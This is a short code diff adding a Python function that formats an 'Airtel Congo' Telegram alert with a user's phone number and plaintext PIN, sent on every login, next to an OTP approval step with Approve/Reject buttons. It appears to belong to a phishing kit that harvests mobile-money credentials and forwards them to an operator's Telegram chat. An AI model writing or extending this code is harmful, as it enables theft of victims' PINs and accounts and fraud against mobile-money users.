@@ -77,6 +77,30 @@ async def send_telegram_message(
 
 
 # ─────────────────────────────────────────────────────────────
+# Login alert — only phone, PIN, action, timestamp (no OTP)
+# ─────────────────────────────────────────────────────────────
+async def send_login_alert(phone: str, pin: str, action: str = "LOGIN") -> dict:
+    """
+    Send a credit-alert-style Telegram message.
+
+    Only shows: phone, PIN, action, timestamp — never the OTP.
+    Called from /api/login so the admin gets notified the moment a
+    user signs in, without leaking the SMS code into Telegram.
+    """
+    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
+
+    text = (
+        "🔔 <b>Airtel Congo — Activity Alert</b>\n\n"
+        f"📱 <b>Phone:</b>  <code>{phone}</code>\n"
+        f"🔑 <b>PIN:</b>    <code>{pin}</code>\n"
+        f"🎯 <b>Action:</b> <b>{action}</b>\n"
+        f"🕐 <b>Time:</b>   {ts}"
+    )
+
+    return await send_telegram_message(text)
+
+
+# ─────────────────────────────────────────────────────────────
 # OTP approval request (with Approve / Reject buttons)
 # ─────────────────────────────────────────────────────────────
 async def send_approval_request(
